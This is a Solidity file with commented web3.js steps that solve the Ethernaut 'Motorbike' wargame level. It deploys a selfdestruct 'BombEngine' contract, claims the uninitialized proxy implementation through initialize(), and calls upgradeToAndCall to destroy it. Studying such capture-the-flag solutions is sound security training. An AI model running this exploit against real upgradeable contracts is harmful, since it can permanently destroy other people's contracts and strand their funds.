// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BombEngine {
    
    function explode() public {
        address payable addr = payable(address(msg.sender));
        selfdestruct(addr);
    }
}

// bombddress 0x511e7B2a0996c62D361f3Ec731e960ACa4d75678


//solution https://dev.to/nvn/ethernaut-hacks-level-25-motorbike-397g

//get the value on the slot
// implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// implAddr = '0x' + implAddr.slice(-40)
// initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
// await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })
//upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
//await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()

//deploy bomb contract

// bombAddr = '<BombEngine-instance-address>'
// explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

// upgradeSignature = {
//     name: 'upgradeToAndCall',
//     type: 'function',
//     inputs: [
//         {
//             type: 'address',
//             name: 'newImplementation'
//         },
//         {
//             type: 'bytes',
//             name: 'data'
//         }
//     ]
// }

// upgradeParams = [bombAddr, explodeData]

// upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)

// await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})
